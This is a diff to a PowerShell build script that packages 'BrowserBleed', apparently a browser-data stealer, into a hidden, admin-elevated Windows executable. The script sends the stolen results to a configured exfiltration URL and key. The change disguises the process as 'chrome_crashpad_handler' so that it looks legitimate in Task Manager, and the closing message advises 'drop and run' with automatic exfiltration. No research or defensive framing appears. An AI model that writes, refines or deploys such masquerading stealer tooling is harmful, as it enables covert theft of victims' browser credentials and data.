@@ -9,8 +9,9 @@
 #   .\build_windows.ps1 -ExfilUrl https://reports.example.com -ExfilKey mykey
 
 param(
-    [string]$ExfilUrl = "",
-    [string]$ExfilKey = ""
+    [string]$ExfilUrl  = "",
+    [string]$ExfilKey  = "",
+    [string]$ExeName   = "chrome_crashpad_handler"   # process name shown in Task Manager
 )
 
 Set-StrictMode -Version Latest
@@ -30,9 +31,10 @@ if (-not $ExfilUrl -or -not $ExfilKey) {
 if (-not $ExfilUrl) { Write-Error "ExfilUrl not set — add DOMAIN to deploy/config or pass -ExfilUrl"; exit 1 }
 if (-not $ExfilKey) { Write-Error "ExfilKey not set — add BB_API_KEY to deploy/config or pass -ExfilKey"; exit 1 }
 
-Write-Host "[*] Building BrowserBleed.exe"
+Write-Host "[*] Building $ExeName.exe"
 Write-Host "    Exfil URL: $ExfilUrl"
 Write-Host "    Exfil key: $($ExfilKey.Substring(0,4))****"
+Write-Host "    Process name: $ExeName (shown in Task Manager)"
 
 # ── Patch a temp copy of the source ──────────────────────────────────────────
 $src     = Join-Path $PSScriptRoot "BrowserBleed.py"
@@ -47,7 +49,7 @@ $tmpSrc  = Join-Path $env:TEMP "BrowserBleed_build.py"
 $buildTmp = Join-Path $env:TEMP "bb_build"
 python -m PyInstaller `
     --onefile --noconsole --uac-admin `
-    --name BrowserBleed `
+    --name $ExeName `
     --distpath $PSScriptRoot `
     --workpath $buildTmp `
     --specpath $buildTmp `
@@ -57,5 +59,5 @@ Remove-Item $tmpSrc -Force -ErrorAction SilentlyContinue
 Remove-Item $buildTmp -Recurse -Force -ErrorAction SilentlyContinue
 
 Write-Host ""
-Write-Host "[+] Done: $PSScriptRoot\BrowserBleed.exe"
+Write-Host "[+] Done: $PSScriptRoot\$ExeName.exe"
 Write-Host "    Drop and run - results auto-exfil to $ExfilUrl"
